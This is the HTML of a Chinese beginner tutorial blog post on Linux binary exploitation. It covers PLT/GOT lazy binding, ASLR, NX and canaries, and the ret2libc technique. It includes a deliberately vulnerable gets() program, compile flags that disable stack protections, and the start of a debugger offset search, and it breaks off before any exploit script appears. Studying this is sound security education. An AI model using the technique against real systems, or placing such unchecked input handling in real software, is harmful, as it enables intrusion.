@@ -1,0 +1,988 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn,gdb,ropgadget,ret2libc,动态链接,延迟绑定机制,PLT&GOT,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="ret2libcPLT表和GOT表Linux下的动态链接是通过PLT&amp;amp;GOT来实现的  关于动态链接与静态链接，可以打个比方就是：如果我的文章引用了别人的一部分文字，在我发布文章的时候把别人的段落复制到我的文章里面就属于静态连接，而做一个超链接就属于动态链接。  通常来说，我们提到的“表项”是PLT、GOT表，在可执行文件中他们的内容位于.plt节、.got.plt节和.got节。|  节">
+<meta name="keywords" content="pwn,gdb,ropgadget,ret2libc,动态链接,延迟绑定机制,PLT&amp;GOT">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn入门学习">
+<meta property="og:url" content="http://yoursite.com/2020/04/08/pwn入门学习/index.html">
+<meta property="og:site_name" content="pukr&#39;s BLOG">
+<meta property="og:description" content="ret2libcPLT表和GOT表Linux下的动态链接是通过PLT&amp;amp;GOT来实现的  关于动态链接与静态链接，可以打个比方就是：如果我的文章引用了别人的一部分文字，在我发布文章的时候把别人的段落复制到我的文章里面就属于静态连接，而做一个超链接就属于动态链接。  通常来说，我们提到的“表项”是PLT、GOT表，在可执行文件中他们的内容位于.plt节、.got.plt节和.got节。|  节">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/pwn入门学习/objdump1.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/pwn入门学习/pwn入门学习//plt1.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/pwn入门学习/pwn入门学习//plt3.jpeg">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/pwn入门学习/pwn入门学习//plt2.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/pwn入门学习/plt4.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/pwn入门学习/plt5.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/pwn入门学习/pwn入门学习//plt6.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/pwn入门学习/plt7.jpeg">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/pwn入门学习/plt8.jpeg">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/pwn入门学习/system.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/pwn入门学习/ropgadget.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/pwn入门学习/offset.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/pwn入门学习/jmpesp.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/pwn入门学习/execve.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/pwn入门学习/编译.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/pwn入门学习/dw_objdump1.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/pwn入门学习/dw_objdump2.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/pwn入门学习/dw_objdump3.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/pwn入门学习/dw_objdump4.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/pwn入门学习/溢出点.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/pwn入门学习/offset1.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/pwn入门学习/溢出点2.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/pwn入门学习/canary.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/pwn入门学习/canary2.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/pwn入门学习/格式化字符串1.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/pwn入门学习/存储.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/pwn入门学习/格式化字符串2.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/pwn入门学习/格式化字符串3.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/pwn入门学习/格式化字符串4.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/pwn入门学习/canary_stack.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/pwn入门学习/canary1.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/pwn入门学习/canary_python.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/pwn入门学习/确定偏移.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/pwn入门学习/小端存储.png">
+<meta property="og:updated_time" content="2022-04-24T00:49:47.993Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="pwn入门学习">
+<meta name="twitter:description" content="ret2libcPLT表和GOT表Linux下的动态链接是通过PLT&amp;amp;GOT来实现的  关于动态链接与静态链接，可以打个比方就是：如果我的文章引用了别人的一部分文字，在我发布文章的时候把别人的段落复制到我的文章里面就属于静态连接，而做一个超链接就属于动态链接。  通常来说，我们提到的“表项”是PLT、GOT表，在可执行文件中他们的内容位于.plt节、.got.plt节和.got节。|  节">
+<meta name="twitter:image" content="http://yoursite.com/2020/04/08/pwn入门学习/objdump1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/04/08/pwn入门学习/">
+
+
+
+
+
+  <title>pwn入门学习 | pukr's BLOG</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">pukr's BLOG</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">人类的悲欢并不相通</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/08/pwn入门学习/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="尘林">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/zql.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="pukr's BLOG">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">pwn入门学习</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-08T15:07:29+08:00">
+                2020-04-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><h2 id="PLT表和GOT表"><a href="#PLT表和GOT表" class="headerlink" title="PLT表和GOT表"></a>PLT表和GOT表</h2><p>Linux下的动态链接是通过PLT&amp;GOT来实现的</p>
+<blockquote>
+<p>关于动态链接与静态链接，可以打个比方就是：如果我的文章引用了别人的一部分文字，在我发布文章的时候把别人的段落复制到我的文章里面就属于静态连接，而做一个超链接就属于动态链接。</p>
+</blockquote>
+<p>通常来说，我们提到的“表项”是PLT、GOT表，在可执行文件中他们的内容位于.plt节、.got.plt节和.got节。<br>|  节名   |  说明  |<br>|  ——  | ——  |<br>| .plt  | 过程链接表，存放在.text段。PLT表项的内容存放在.plt节中。这个表中包含一些代码，有两个作用：①如果没有调用过函数，则调用链接器解析该外部函数的真实地址并填充到对应的.got.plt节中。②如果调用过该函数，那么直接到 .got.plt 节中跳转到真实地址。 |<br>| .got  | 全局偏移表，GOT表的一部分，存放所有外部符号。 |<br>| .got.plt  | 全局偏移表，存放在.rodata段。GOT表的另一部分，相当于.plt节的GOT全局偏移表。有两个作用：①如果没有调用过函数，则跳转回.plt节头调用链接器解析该外部函数的真实地址并填充到这个地址。②如果调用过该函数，那么这个地址中就保存的是真实地址。 |</p>
+<a id="more"></a>
+<p>C语言代码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"hello world\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>编译：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -o test.exe test.c</span><br></pre></td></tr></table></figure></p>
+<p>查看plt表：<br>objdump命令是Linux下的反汇编目标文件或者可执行文件的命令，它以一种可阅读的格式让你更多地了解二进制文件可能带有的附加信息。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d -j .plt test.exe</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">--disassemble </span><br><span class="line">-d </span><br><span class="line">从objfile中反汇编那些特定指令机器码的section。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-j name</span><br><span class="line">--section=name </span><br><span class="line">仅仅显示指定名称为name的section的信息</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/04/08/pwn入门学习/objdump1.png" alt></p>
+<p>可以看到，所有plt表里的函数地址都是负数，也就是说，printf函数位于glibc动态库内，所以在编译和链接阶段，链接器无法知知道进程运行起来之后printf函数的加载地址。只有进程运运行后，printf函数的地址才能确定。</p>
+<p>进程运行起来之后，glibc动态库也装载了，printf函数地址亦已确定，上述call指令如何修改（重定位）呢？</p>
+<p>一个简单的方法就是将指令中的<code>printf函数地址</code>修改printf函数的真正地址即可。</p>
+<p>但这个方案面临两个问题：</p>
+<blockquote>
+<p>现代操作系统不允许修改代码段，只能修改数据段<br>如果print_banner函数是在一个动态库（.so对象）内，修改了代码段，那么它就无法做到系统内所有进程共享同一个动态库。</p>
+</blockquote>
+<p>因此，printf函数地址只能回写到数据段内，而不能回写到代码段上。</p>
+<p>链接器会额外生成一小段代码，通过这段代码来获取 printf() 的地址，像下面这样，进行链接的时候只需要对printf_stub() 进行重定位操作就可以</p>
+<p><img src="pwn入门学习//plt1.png" alt></p>
+<p>简化为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">// 调用printf的call指令</span><br><span class="line">call printf_stub</span><br><span class="line">...</span><br><span class="line">printf_stub:</span><br><span class="line">    mov rax, [printf函数的储存地址] // 获取printf重定位之后的地址</span><br><span class="line">    jmp rax // 跳过去执行printf函数</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">...</span><br><span class="line">printf函数的储存地址,这里储存printf函数重定位后的地址</span><br></pre></td></tr></table></figure></p>
+<p>总体来说，动态链接每个函数需要两个东西：<br>1、用来存放外部函数地址的数据段<br>2、用来获取数据段记录的外部函数地址的代码</p>
+<p>为什么设置成这么奇怪的结构，后面会说明。</p>
+<p>对应有两个表，一个用来存放外部的函数地址的数据表称为全局偏移表（GOT, Global Offset Table），那个存放额外代码的表称为程序链接表（PLT，Procedure Link Table）<br><img src="pwn入门学习//plt3.jpeg" alt></p>
+<p>可执行文件里面保存的是 PLT 表的地址，对应 PLT 地址指向的是 GOT 的地址，GOT 表指向的就是 glibc 中的地址</p>
+<p>在这里面想要通过 PLT表获取函数的地址，首先要保证 GOT 表已经获取了正确的地址。但是如果当一个文件中存在大量的函数时，如果在程序运行前就重定位好所有的函数调用的话虽然会减轻函数调用的时间，但是会大大增加程序的启动时间，是整个程序变得很慢。因此Linux便产生了延迟重定位：也就是当你调用函数的时候函数才开始执行重定位和地址解析工作。</p>
+<h2 id="延迟绑定机制"><a href="#延迟绑定机制" class="headerlink" title="延迟绑定机制"></a>延迟绑定机制</h2><p>只有动态库函数在被调用时，才会地址解析和重定位工作，为此可以使用类似这样的代码来实现：</p>
+<p>跳转到<code>&lt;printf@plt&gt;</code>看看发生了什么<br><img src="pwn入门学习//plt2.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0x56556030 &lt;puts@plt&gt;                  jmp    dword ptr [ebx + 0xc] &lt;0x5655900c&gt;</span><br><span class="line"> </span><br><span class="line">0x56556036 &lt;puts@plt+6&gt;                push   0</span><br><span class="line">0x5655603b &lt;puts@plt+11&gt;               jmp    0x56556020</span><br><span class="line"> ↓</span><br><span class="line">0x56556020                             push   dword ptr [ebx + 4]</span><br><span class="line">0x56556026                             jmp    dword ptr [ebx + 8]</span><br><span class="line"> ↓</span><br><span class="line">0xf7fe9440 &lt;_dl_runtime_resolve&gt;       push   eax</span><br><span class="line">0xf7fe9441 &lt;_dl_runtime_resolve+1&gt;     push   ecx</span><br><span class="line">0xf7fe9442 &lt;_dl_runtime_resolve+2&gt;     push   edx</span><br><span class="line">0xf7fe9443 &lt;_dl_runtime_resolve+3&gt;     mov    edx, dword ptr [esp + 0x10]</span><br><span class="line">0xf7fe9447 &lt;_dl_runtime_resolve+7&gt;     mov    eax, dword ptr [esp + 0xc]</span><br><span class="line">0xf7fe944b &lt;_dl_runtime_resolve+11&gt;    call   _dl_fixup &lt;0xf7fe37f0&gt;</span><br></pre></td></tr></table></figure>
+<p>简化为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//一开始没有重定位的时候将 printf@got 填成 lookup_printf 的地址</span><br><span class="line">void printf@plt()</span><br><span class="line">&#123;</span><br><span class="line">address_good:</span><br><span class="line">    jmp *printf@got   </span><br><span class="line">lookup_printf:</span><br><span class="line">    调用重定位函数查找 printf 地址，并写到 printf@got</span><br><span class="line">	goto address_good;//再返回去执行address_good</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>看看栈中出现的其他地址分别是什么：<br><img src="/2020/04/08/pwn入门学习/plt4.png" alt></p>
+<p>继续n，看到这样的指令：<br><img src="/2020/04/08/pwn入门学习/plt5.png" alt><br>进入到了<code>&lt;_dl_runtime_resolve&gt;</code>函数。</p>
+<p>再继续执行，发现了<code>call_dl_fixup &lt;0xf7fe37f0&gt;</code>指令。这是真正的寻址。</p>
+<p>执行完这个函数后，再回来看GOT表中储存printf函数真实地址的内存单元：<br><img src="pwn入门学习//plt6.png" alt><br>可见，这时候存储的就是glibc中真实的printf（puts）函数的地址了。</p>
+<p>这里还有很多细节问题，我暂时没有清楚。但是大致流程是这样的。</p>
+<p>第一次调用：<br><img src="/2020/04/08/pwn入门学习/plt7.jpeg" alt></p>
+<p>再一次调用：<br><img src="/2020/04/08/pwn入门学习/plt8.jpeg" alt></p>
+<h2 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h2><p>ASLR（Address Space Layout Randomization，地址空间布局随机化）。ASLR是一种对栈、模块、动态分配的内存空间等的地址（位置）进行随即配置的机制。<br>可以通过<code>/proc/sys/kernel/randomize_va_space</code>进行修改。cat查看值由三种状态</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0：禁用</span><br><span class="line">1：除堆以外随机化</span><br><span class="line">2：全部随机化</span><br></pre></td></tr></table></figure>
+<p>（就是PIE保护机制）<br>checksec看一下保护机制：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">seclab@seclabPC:/home/PycharmProjectspy2/pwn$ checksec ./test00</span><br><span class="line">[*] '/home/PycharmProjectspy2/pwn/test00'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure></p>
+<h2 id="Exec-Shield（NX）"><a href="#Exec-Shield（NX）" class="headerlink" title="Exec-Shield（NX）"></a>Exec-Shield（NX）</h2><p>除存放可执行代码的内存空间以外，对其余内存空间禁用执行权限。<br>Exec-Shield是一种通过“限制内存空间的读写和执行权限”来防御攻击的机制。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">seclab@seclabPC:/home/PycharmProjectspy2/pwn$ checksec ./test02</span><br><span class="line">[*] '/home/PycharmProjectspy2/pwn/test02'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure></p>
+<p>关闭NX保护：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -z execstack -o test test.c</span><br></pre></td></tr></table></figure></p>
+<p>查看某个程序在进程内存空间的读写和执行权限，在程序运行时输入<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">seclab@seclabPC:/home/PycharmProjectspy2/pwn$ ps -aef | grep test02</span><br><span class="line">seclab     3200   3147  0 10:46 pts/0    00:00:00 ./test02</span><br><span class="line">seclab     3233   3224  0 10:47 pts/1    00:00:00 grep --color=auto test02</span><br><span class="line">seclab@seclabPC:/home/PycharmProjectspy2/pwn$ cat /proc/3200/maps | grep stack</span><br><span class="line">ff9ae000-ff9cf000 rw-p 00000000 00:00 0                                  [stack]</span><br></pre></td></tr></table></figure></p>
+<p>可以看到栈空间为ff9ae000-ff9cf000，权限为rw-p,没有代表执行权限的x。</p>
+<h2 id="StackGuard"><a href="#StackGuard" class="headerlink" title="StackGuard"></a>StackGuard</h2><p>就是canary保护机制，之前写过的格式化字符串绕过canary保护机制。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">seclab@seclabPC:/home/PycharmProjectspy2/pwn$ checksec ./test03</span><br><span class="line">[*] '/home/PycharmProjectspy2/pwn/test03'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></p>
+<p>可以看到后面还带有 RWX： HasRWX segments 有这个基本就是ret2shellcode。因为程序中存在可读可写可执行的片段这很危险的。</p>
+<h2 id="ret2libc-1"><a href="#ret2libc-1" class="headerlink" title="ret2libc"></a>ret2libc</h2><p>使用ret2libc技术绕过NX保护，他的思路是：即使无法执行任何代码（shellcode），但是只要能运行任意程序，就能获得shell。</p>
+<p>C语言代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">char buf2[10] = &quot;this is buf2&quot;;</span><br><span class="line">void vul()</span><br><span class="line">&#123;</span><br><span class="line">	char buf1[10];</span><br><span class="line">	gets(buf1);</span><br><span class="line">&#125;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">	write(1,&quot;sinxx&quot;,5);</span><br><span class="line">	vul();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>编译一下：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seclab@seclabPC:/home/PycharmProjectspy2/pwn$ gcc -fno-stack-protector -no-pie -o nx nx.c</span><br></pre></td></tr></table></figure></p>
+<p>查看保护机制：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">seclab@seclabPC:/home/PycharmProjectspy2/pwn$ checksec ./nx</span><br><span class="line">[*] '/home/PycharmProjectspy2/pwn/nx'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure></p>
+<p>开启了堆栈不可执行保护。</p>
+<p>为什么不直接找到system和/bin/sh在got的地址呢？<br>由于延迟绑定机制，PLT和GOT是程序编译时采用，system和/bin/sh并不在程序中，所以没有他们的地址。<br><img src="/2020/04/08/pwn入门学习/system.jpg" alt><br><img src="/2020/04/08/pwn入门学习/ropgadget.jpg" alt><br>使用objdump或者ROPgadgets查看，编译出来的文件中不包含system函数和’/bin/sh’字符串。</p>
+<p>但是glibc的地址是泄露了的，所以通过泄露的地址再减去偏移可计算出基址。<br>基址加上需要的偏移就会得到任意函数或者字符串。<br>第一次输入获得泄露的真实地址并接收，返回地址用可在此执行rop链的函数覆盖。第二次输入发送payload并getshell。<br>通常用elf来寻找真实地址，而不是手动寻找。我们可以知道gets函数在got表中的地址，<br>地址的偏移是一致的，所以gets函数真实地址减去libc中的地址就是真实地址与libc地址的偏移量，system函数在libc中的地址加上这个偏移量就是system函数的真实地址。<br>如何得知gets函数的真实地址呢？<br>由于延迟绑定机制，只有函数使用一遍之后got表中才存储着真正的地址，所以我们需要利用gets函数溢出两次。第一次溢出返回地址填写writes函数的地址，然后输出gets函数的真实地址；第二次溢出就返回到system函数的地址了。</p>
+<p>查看程序所需要得动态链接库（so）：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">seclab@seclabPC:/home/PycharmProjectspy2/pwn$ ldd ./nx</span><br><span class="line">	linux-gate.so.1 (0xf7efb000)</span><br><span class="line">	libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7d03000)</span><br><span class="line">	/lib/ld-linux.so.2 (0xf7efc000)</span><br></pre></td></tr></table></figure></p>
+<p>计算offset：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> cyclic 100</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa</span><br><span class="line"><span class="meta">pwndbg&gt;</span> r</span><br><span class="line">Starting program: /home/PycharmProjectspy2/pwn/nx </span><br><span class="line">sinxxaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x61676161 in ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span 